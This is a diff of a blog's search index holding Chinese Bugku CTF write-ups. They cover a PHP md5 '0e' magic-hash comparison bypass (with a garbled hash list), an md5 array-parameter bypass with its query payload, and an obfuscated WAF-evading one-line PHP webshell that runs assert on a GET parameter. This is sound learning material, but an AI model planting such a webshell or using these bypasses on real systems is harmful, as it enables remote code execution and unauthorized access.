@@ -1,6 +1,44 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[WP-Bugku-login1(SKCTF)]]></title>
+    <url>%2F2018%2F08%2F09%2FWriteup%2FWP-Bugku-login1-SKCTF%2F</url>
+    <content type="text"></content>
+      <categories>
+        <category>WriteUp</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>Bugku</tag>
+        <tag>SQL约束攻击</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[WP-Bugku-多次]]></title>
+    <url>%2F2018%2F08%2F09%2FWriteup%2FWP-Bugku-%E5%A4%9A%E6%AC%A1%2F</url>
+    <content type="text"></content>
+      <categories>
+        <category>WriteUp</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>Bugku</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[WP-Bugku-md5 collision(NUPT_CTF)]]></title>
+    <url>%2F2018%2F08%2F09%2FWriteup%2FWP-Bugku-md5-collision-NUPT-CTF%2F</url>
+    <content type="text"><![CDATA[题目地址：http://120.24.86.145:9009/md5.php md5 collision（MD5碰撞）：本段转自https://www.jianshu.com/p/2791e2fdadfd MD5摘要算法可以从多个字节组成的串中计算出由32个字节构成的“特征串”，对于超过32字节的串来说，MD5计算得出的值必然是其一个子集，所以必然存在不同的串能够得出相同MD5值的情况，即碰撞。 在PHP中的MD5中的0e的比较：PHP在处理哈希字符串时，会利用“！=”或“==”来对哈希值进行比较，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。 这里给出常用的0e开头的MD5：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e5093672134182067008420087635140e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 抓包测试得到flag{md5_collision_is_easy}]]></content>
+      <categories>
+        <category>WriteUp</category>
+      </categories>
+      <tags>
+        <tag>Bugku</tag>
+        <tag>MD5</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[WP-Bugku-前女友(SKCTF)]]></title>
     <url>%2F2018%2F08%2F08%2FWriteup%2FWP-Bugku-%E5%89%8D%E5%A5%B3%E5%8F%8B(SKCTF)%2F</url>
     <content type="text"><![CDATA[题目链接：http://118.89.219.210:49162/ 打开题目后有一堆文字，查看源码，有一个链接，点进去后得到源码：123456789101112&lt;?phpif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; $v3 = $_GET['v3']; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; if(!strcmp($v3, $flag))&#123; echo $flag; &#125; &#125;&#125;?&gt; 在PHP中，MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])==null,md5(b[])==null，md5(a[])=md5(b[])=null,这样就得到答案了。 所以构造出参数：?v1[]=1&amp;v2[]=2&amp;v3[]=3url:http://118.89.219.210:49162/?v1[]=1&amp;&amp;v2[]=2&amp;&amp;v3[]=3 得到SKCTF{Php_1s_tH3_B3St_L4NgUag3}]]></content>
@@ -29,7 +67,7 @@
   <entry>
     <title><![CDATA[WP-Bugku-过狗一句话]]></title>
     <url>%2F2018%2F08%2F08%2FWriteup%2FWP-Bugku-%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%2F</url>
-    <content type="text"><![CDATA[送给大家一个过狗一句话123456&lt;?php$poc="a#s#s#e#r#t";$poc_1=explode("#",$poc);$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5];$poc_2($_GET['s'])?&gt; 搜索到的几种解法： 1. s=print_r(scandir(&apos;./&apos;)) http://120.24.86.145:8010/?s=print_r(scandir(&apos;./&apos;)) 2. s=print_r(glob(&quot;*.*&quot;)) http://120.24.86.145:8010/?s=print_r(glob(&quot;*.*&quot;)) scandir()函数： scandir() 函数返回指定目录中的文件和目录的数组。glob()函数：glob() 函数返回匹配指定模式的文件名或目录。该函数返回一个包含有匹配文件 / 目录的数组。如果出错返回 false。]]></content>
+    <content type="text"><![CDATA[题目地址：http://120.24.86.145:8010/ 送给大家一个过狗一句话：&lt;?php $poc=&quot;a#s#s#e#r#t&quot;;$poc_1=explode(&quot;#&quot;,$poc);$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5];$poc_2($_GET[&#39;s&#39;])?&gt; 搜索到的几种解法： 1. s=print_r(scandir(&apos;./&apos;)) http://120.24.86.145:8010/?s=print_r(scandir(&apos;./&apos;)) 2. s=print_r(glob(&quot;*.*&quot;)) http://120.24.86.145:8010/?s=print_r(glob(&quot;*.*&quot;)) scandir()函数： scandir() 函数返回指定目录中的文件和目录的数组。glob()函数：glob() 函数返回匹配指定模式的文件名或目录。该函数返回一个包含有匹配文件 / 目录的数组。如果出错返回 false。]]></content>
       <categories>
         <category>WriteUp</category>
       </categories>
@@ -119,8 +157,8 @@
         <category>Learning</category>
       </categories>
       <tags>
-        <tag>笔记</tag>
         <tag>SQL</tag>
+        <tag>笔记</tag>
         <tag>Web</tag>
       </tags>
   </entry>
@@ -145,8 +183,8 @@
         <category>Learning</category>
       </categories>
       <tags>
-        <tag>笔记</tag>
         <tag>SQL</tag>
+        <tag>笔记</tag>
         <tag>Web</tag>
       </tags>
   </entry>
